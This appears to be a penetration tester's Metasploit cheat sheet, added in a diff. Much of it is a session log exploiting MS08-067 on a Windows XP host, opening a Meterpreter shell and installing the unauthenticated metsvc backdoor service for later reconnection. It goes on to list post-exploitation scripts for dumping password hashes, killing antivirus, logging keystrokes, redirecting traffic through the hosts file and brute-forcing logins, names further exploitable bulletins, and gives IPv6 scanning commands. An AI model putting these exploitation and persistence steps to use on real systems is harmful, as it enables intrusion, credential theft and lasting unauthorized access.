+msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/bind_tcp
+PAYLOAD => windows/meterpreter/bind_tcp
+
+msf exploit(ms08_067_netapi) > exploit
+
+[*] Started bind handler
+[*] Automatically detecting the target...
+[*] Fingerprint: Windows XP Service Pack 0 / 1 - lang:English
+[*] Selected Target: Windows XP SP0/SP1 Universal
+[*] Triggering the vulnerability...
+[*] Sending stage (723456 bytes)
+[*] Meterpreter session 1 opened (192.168.0.3:36842 -> 192.168.0.9:4444)
+
+
+meterpreter > run metsvc
+[*] Creating a meterpreter service on port 31337
+[*] Creating a temporary installation directory
+C:\WINDOWS\TEMP\iTImctYkkgUlqQ...
+[*]  >> Uploading metsrv.dll...
+[*]  >> Uploading metsvc-server.exe...
+[*]  >> Uploading metsvc.exe...
+[*] Starting the service...
+        * Installing service metsvc
+* Starting service
+Service metsvc successfully installed.
+
+meterpreter>
+To conenct back to host later:
+
+Background session 2? [y/N]  y
+msf exploit(ms08_067_netapi) > back
+
+msf > use exploit/multi/handler
+msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp
+PAYLOAD => windows/metsvc_bind_tcp
+msf exploit(handler) > set LPORT 31337
+LPORT => 31337
+msf exploit(handler) > set RHOST 192.168.0.9
+RHOST => 192.168.0.9
+
+msf exploit(handler) > exploit
+
+[*] Starting the payload handler...
+[*] Started bind handler
+[*] Meterpreter session 3 opened (192.168.0.3:49164 -> 192.168.0.9:31337)
+
+meterpreter >
+Background session 3? [y/N]
+msf exploit(handler) > sessions -l
+
+Active sessions
+===============
+
+  Id  Description  Tunnel
+  --  -----------  ------
+  2  Meterpreter  192.168.0.3:41472 -> 192.168.0.9:4444
+  3  Meterpreter  192.168.0.3:49164 -> 192.168.0.9:31337
+
+
+Caution, the meterpreter listener doesn't require authentication, anybody
+who can access the meterpreter port (in this case 31337) could connect to
+the target and gain system privs.
+
+If victim is using DHCP rhost can be changed:
+
+If you installed metsvc and the target system changed IPs, you would
+have to scan the network looking for the port. Alternatively, use the
+"persistence" script in Meterpreter and configure it to reverse connect.
+Either way, make sure you disable the metsvc/persistent agent when you
+are done with the test.
+
+***************************************************************************************************
+
+Built in Meterpreter Scripts:
+
+browserenum		-
+
+checkvm			-checks to see if the compromised host is actually a VM
+
+deploymsf ***		-used to deploy entire metasploit instance as a payload. Not built in***
+			 http://www.offensive-security.com/msf/deploymsf.rb
+
+execute			-execute -f cmd.exe -H -i	spawns a command shell and makes it 
+			 interactive
+
+get_local_subnets	-just what it sounds like
+
+getcountermeasure.rb 	-for the identification of 3rd part anti-virus, HIPS, HIDS, Firewalls as well
+			 as Windows Security Settings.  On Vista if UAC is enabled
+
+getgui.rb		-for enabling the RDP service on target host, you can also add a user account 
+			 and set up the right permission on the target if Meterpreter is running under
+			 the right privileges
+
+gettelnet.rb		-for enabling telnet server on Win2k3 and XP systems.  On Vista and 2008 it
+			 will install the service and configure it.
+
+hashdump		-dumps the hash information for all users on system.  Great for running 
+			 through jack the ripper
+
+hostsedit		-This Meterpreter script is for adding entries in to the Windows Hosts file.
+			 Since Windows will check first the Hosts file instead of the configured DNS 
+			 Server it will assist in diverting traffic to the fake entry or entries. 
+
+keylogrecorder.rb 	-saves all keystrokes entered on a target machine and save them in a sqlite db
+			 for later analysis
+
+killav			-kill anti-virus on target computer
+
+memdump			-memory dump?
+
+metsvc			-creates a multi/handler 'service' or daemon for connecting to at a later date
+			 or migrating your process to
+
+migrate			-launches a process and migrates the metasploit session to the new process.  
+			 Handy if the exploit is short lived.  i.e. exploit dies when pdf file is 
+			 closed.
+
+multicommand		-run multiple commands in a comma separated list
+
+multiscript		-run multiple scripts
+
+netenum.rb		-Network enumeration script for performing ping sweeps, reverse DNS lookups, 
+			 general DNS record query and SRV Record enumeration. 
+
+packetrecorder		-packet capture
+
+prefetchtool		-extracts information from windows prefetch folder.  Shows installed programs
+
+remotewinenum 		-This script will enumerate OTHER windows hosts in the target environment 
+
+scheduleme		-This script provides most common scheduling types used during a pentest.
+			 It has the functionality to upload a desired executable or script and schedule
+			 the file uploaded. All scheduled task are as System so Meterpreter process must
+			 be System or local admin for local schedules and Administrator for remote schedules
+
+schtasksabuse		-for running commands on targets system using the Windows Scheduler
+
+scraper			-harvest system info including network shares, registry hives and password hashes
+			 /Users/jimmyt/.msf3/logs/scraper
+
+search_dwld		-recursively search for and download files matching a given pattern
+
+soundrecorder		-
+
+uploadexec		-upload a script or executable and run it
+
+virtualbox_sysenter_dos	-DoS Virtual Box
+
+vnc			-loads VNC for remote control
+
+winbf.rb		-script for performing windows login brute force attack against a remote host
+			 from the target machine
+
+winenum.rb		-windows enumeration script that will perform a series of commands depending
+			 on the OS and permission level gathering all types of information that can 
+			 later be leveraged for further attacks, it also has the ability to export and
+			 download the targets host registry.
+
+
+
+
+Additional Meterpreter Scripts:
+	http://www.darkoperator.com/meterpreter/
+
+
+
+Exploits:
+Windows
+	MS-RPC-DCOM: 	MS 03-026
+	LSASS:		MS 04-11
+	uPNP:		MS 05-039
+	RRAS:		MS 06-025
+	Server Service:	MS 06-040
+	Server Service:	MS 08-067
+
+Data Backup Products
+	Veritas
+	CA Brightstor
+	Arkeia
+
+VNC	Authentication Bypass
+
+***************************************************************************************************
+IPv6
+	Send ICMP request to the IPv6 multicast addresses and discover existing systems
+	running IPv6:
+		use auxiliary/scanner/discovery/ipv6_multicast_ping
+		run
+
+	Use the ARP protocol to discover active IPv4 addresses and then identifies 
+	corresponding IPv6 addresses for the systems.
+		use auxiliary/scanner/discovery/ipv6_neighbor
+		set RHOSTS 10.180.195.0/24
+		run
+
+	IPv6 Port Scanner:
+		user auxiliary/scanner/portscan/tcp
+		set RHOSTS fe80::221:9bff:fe95:295e	
+		set PORTS "7,21,22,23,25" or "1-65535"
+		set THREADS 50
+		run
